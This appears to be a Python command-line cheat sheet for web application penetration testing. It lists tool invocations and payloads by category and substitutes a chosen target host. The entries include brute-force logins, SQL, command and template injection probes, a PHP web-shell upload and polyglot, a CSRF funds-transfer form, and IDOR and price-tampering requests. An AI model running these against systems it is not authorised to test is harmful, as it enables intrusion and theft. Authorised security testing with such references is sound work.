#!/usr/bin/env python3
"""
Web Application Penetration Testing Commands Reference
This script provides a collection of common penetration testing commands for web application security testing.
"""

import argparse
import sys
import re
import os
import subprocess

# Dictionary of command categories and their respective commands
web_pentest_commands = {
    "Reconnaissance": {
        "WHOIS Lookup": "whois example.com",
        "DNS Enumeration": "dig example.com ANY",
        "DNS Zone Transfer": "dig axfr @ns1.example.com example.com",
        "Subdomain Discovery": "amass enum -d example.com",
        "Alternative Subdomain Discovery": "subfinder -d example.com",
        "Subdomain Bruteforce": "gobuster dns -d example.com -w wordlist.txt",
        "Web Tech Identification": "whatweb example.com",
        "SSL/TLS Analysis": "sslscan example.com",
        "Robots.txt Analysis": "curl -s https://example.com/robots.txt",
        "Sitemap Analysis": "curl -s https://example.com/sitemap.xml"
    },

    "Scanning": {
        "Nmap Basic Scan": "/nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt example.com",
        "Nmap Aggressive Scan": "nmap -A -T4 -p- example.com",
        "Nmap Vulnerability Scan": "nmap --script vuln example.com",
        "Nikto Scan": "nikto -h https://example.com",
        "Directory Bruteforce": "gobuster dir -u https://example.com -w wordlist.txt -x php,html,txt",
        "Parameter Discovery": "ffuf -u https://example.com/FUZZ -w paramlist.txt",
        "Wapiti Scan": "wapiti -u https://example.com -v 2"
    },

    "Authentication Testing": {
        "Hydra HTTP Basic Auth": "hydra -L users.txt -P passwords.txt example.com http-get /admin",
        "Hydra HTTP Form Auth": "hydra -l admin -P wordlist.txt example.com http-post-form '/login:username=^USER^&password=^PASS^:F=Login failed'",
        "Password Spray": "medusa -h example.com -u admin -P common_passwords.txt -M http -m DIR:/admin",
        "JWT Testing": "jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ -T"
    },

    "Injection Testing": {
        "SQLMap Basic": "sqlmap -u 'https://example.com/page.php?id=1'",
        "SQLMap POST Data": "sqlmap -u 'https://example.com/login.php' --data='username=admin&password=admin'",
        "SQLMap with Cookie": "sqlmap -u 'https://example.com/' --cookie='PHPSESSID=1234abcd'",
        "NoSQL Injection Test": "curl -X POST https://example.com/login -d 'username[$ne]=admin&password[$ne]=admin'",
        "Command Injection Test": "curl 'https://example.com/search?q=test%3B%20cat%20%2Fetc%2Fpasswd'",
        "SSTI Test": "curl 'https://example.com/page?name={{7*7}}'",
        "XSS Test": "curl 'https://example.com/search?q=<script>alert(1)</script>'"
    },

    "File Upload Testing": {
        "Upload PHP Web Shell": "curl -F 'file=@shell.php;filename=shell.php;type=application/x-php' https://example.com/upload",
        "Upload PHP with GIF Header": "echo -e '\\x47\\x49\\x46\\x38\\x39\\x61<?php system($_GET[\"cmd\"]); ?>' > polyglot.php.gif",
        "SVG XSS Vector": "echo '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>' > xss.svg",
        "Upload path traversal": "curl -F 'file=@shell.php;filename=../shell.php;type=image/jpeg' https://example.com/upload"
    },

    "API Testing": {
        "Basic GET Request": "curl -s -X GET https://api.example.com/users",
        "POST Request with JSON": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"password\"}' https://api.example.com/login",
        "PUT Request": "curl -s -X PUT -H 'Content-Type: application/json' -d '{\"username\":\"admin\"}' https://api.example.com/users/1",
        "DELETE Request": "curl -s -X DELETE https://api.example.com/users/1",
        "GraphQL Introspection": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{name}}}\"}'  https://api.example.com/graphql",
        "JWT Authorization": "curl -s -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' https://api.example.com/users"
    },

    "CSRF Testing": {
        "Basic CSRF Form": "<form action='https://example.com/transfer' method='POST'><input type='hidden' name='amount' value='1000'><input type='hidden' name='recipient' value='attacker'><input type='submit' value='Click me'></form>",
        "CSRF with XHR": "var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://example.com/api/action', true); xhr.withCredentials = true; xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({action: 'delete'}));"
    },

    "Privilege Escalation": {
        "IDOR Test": "curl -s -X GET https://example.com/api/users/2 -H 'Cookie: session=user1cookie'",
        "Horizontal Privilege Escalation": "curl -s -X PUT https://example.com/api/users/2/profile -H 'Cookie: session=user1cookie' -d '{\"name\":\"Hacked\"}'",
        "Parameter Tampering": "curl -s -X POST https://example.com/api/purchase -d '{\"item_id\":1,\"price\":\"0.01\"}'"
    },

    "Tools & Frameworks": {
        "Burp Suite": "Usage: Proxy tool to intercept and modify HTTP/HTTPS traffic",
        "OWASP ZAP": "Usage: Automated scanner and proxy for finding vulnerabilities",
        "Metasploit": "msfconsole -q -x 'use auxiliary/scanner/http/wordpress_login_enum; set RHOSTS example.com; run'",
        "Nuclei Basic Scan": "nuclei -u https://example.com",
        "Nuclei with Templates": "nuclei -u https://example.com -t cves/ -t vulnerabilities/",
        "OWASP Amass": "amass enum -d example.com",
        "Directory wordlists": "SecLists repository: /usr/share/wordlists/SecLists/Discovery/Web-Content/"
    }
}

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def copy_to_clipboard(text):
    """Copy text to clipboard with better error handling and fallback options."""
    clipboard_tools = [
        # Linux options
        {'cmd': ['xclip', '-selection', 'clipboard'], 'name': 'xclip'},
        {'cmd': ['xsel', '-ib'], 'name': 'xsel'},
        # macOS option
        {'cmd': ['pbcopy'], 'name': 'pbcopy'},
    ]
    
    error_messages = []
    
    for tool in clipboard_tools:
        try:
            process = subprocess.Popen(tool['cmd'], stdin=subprocess.PIPE)
            process.communicate(input=text.encode('utf-8'))
            if process.returncode == 0:
                return True, None
        except FileNotFoundError:
            error_messages.append(f"{tool['name']} not found")
        except Exception as e:
            error_messages.append(f"Error with {tool['name']}: {str(e)}")
    
    # If we get here, all clipboard methods failed
    error_detail = " | ".join(error_messages)
    return False, error_detail

def replace_host(command, target_host):
    """Replace example.com with the target host in a command."""
    if not target_host:
        return command
    
    # Replace example.com, api.example.com, etc. with the target host
    replaced = re.sub(r'(https?://)?([a-zA-Z0-9.-]+\.)?example\.com', lambda m: f"{m.group(1) or ''}{target_host}", command)
    return replaced

def print_command_category(category, target_host=None, interactive=False):
    """Print all commands in a specific category and allow selection if interactive."""
    if category in web_pentest_commands:
        print(f"\n=== {category} Commands ===")
        
        commands = list(web_pentest_commands[category].items())
        
        if interactive:
            for i, (cmd_name, cmd) in enumerate(commands, 1):
                print(f"{i}. {cmd_name}")
            
            print("\nOptions:")
            print("  - Enter a number to see and copy a command")
            print("  - Enter 'b' to go back to categories")
            print("  - Enter 'q' to quit")
            
            while True:
                choice = input("\nYour choice: ")
                
                if choice.lower() == 'q':
                    sys.exit(0)
                elif choice.lower() == 'b':
                    return
                elif choice.isdigit() and 1 <= int(choice) <= len(commands):
                    idx = int(choice) - 1
                    cmd_name, cmd = commands[idx]
                    
                    cmd_with_host = replace_host(cmd, target_host)
                    
                    clear_screen()
                    print(f"\n=== {cmd_name} ===\n")
                    print(cmd_with_host)
                    
                    # Copy to clipboard
                    success, error_detail = copy_to_clipboard(cmd_with_host)
                    if success:
                        print("\n✓ Command copied to clipboard!")
                    else:
                        print(f"\n✗ Could not copy to clipboard. {error_detail}")
                    
                    input("\nPress Enter to continue...")
                    clear_screen()
                    
                    print(f"\n=== {category} Commands ===")
                    for i, (cmd_name, cmd) in enumerate(commands, 1):
                        print(f"{i}. {cmd_name}")
                    
                    print("\nOptions:")
                    print("  - Enter a number to see and copy a command")
                    print("  - Enter 'b' to go back to categories")
                    print("  - Enter 'q' to quit")
                else:
                    print("Invalid choice. Please try again.")
        else:
            # Non-interactive mode
            for cmd_name, cmd in commands:
                print(f"\n{cmd_name}:")
                print(f"  {replace_host(cmd, target_host)}")
    else:
        print(f"Category '{category}' not found.")

def list_categories():
    """List all available command categories."""
    print("\nAvailable Categories:")
    for i, category in enumerate(web_pentest_commands.keys(), 1):
        print(f"{i}. {category}")

def main():
    """Main function to execute when script is run directly."""
    parser = argparse.ArgumentParser(description="Web Application Penetration Testing Command Reference")
    parser.add_argument("--host", "-H", help="Target host to use in commands (replaces example.com)")
    parser.add_argument("--category", "-c", help="Show commands for a specific category")
    parser.add_argument("--list", "-l", action="store_true", help="List all categories")
    parser.add_argument("--all", "-a", action="store_true", help="Show all commands")
    
    args = parser.parse_args()
    
    clear_screen()
    print("\n=== Web Application Penetration Testing Command Reference ===")
    print("This script provides commonly used commands for web application security testing.\n")
    
    if args.host:
        print(f"Target host: {args.host}")
    
    # Handle specific command-line arguments
    if args.category:
        found = False
        for category in web_pentest_commands.keys():
            if category.lower() == args.category.lower():
                print_command_category(category, args.host, interactive=False)
                found = True
                break
        if not found:
            print(f"Category '{args.category}' not found.")
            list_categories()
        return
    
    if args.list:
        list_categories()
        return
    
    if args.all:
        for category in web_pentest_commands:
            print_command_category(category, args.host, interactive=False)
        return
    
    # If no specific arguments were provided, start interactive mode
    while True:
        clear_screen()
        print("\n=== Web Application Penetration Testing Command Reference ===")
        print("This script provides commonly used commands for web application security testing.\n")
        
        if args.host:
            print(f"Target host: {args.host}")
        
        list_categories()
        print("\nOptions:")
        print("  - Enter a number to see commands for that category")
        print("  - Enter 'all' to see all commands")
        print("  - Enter 'q' to quit")
        
        choice = input("\nYour choice: ")
        
        if choice.lower() == 'q':
            break
        elif choice.lower() == 'all':
            clear_screen()
            for category in web_pentest_commands:
                print_command_category(category, args.host, interactive=False)
            input("\nPress Enter to continue...")
        elif choice.isdigit() and 1 <= int(choice) <= len(web_pentest_commands):
            category = list(web_pentest_commands.keys())[int(choice) - 1]
            clear_screen()
            print_command_category(category, args.host, interactive=True)
        else:
            print("Invalid choice. Please try again.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()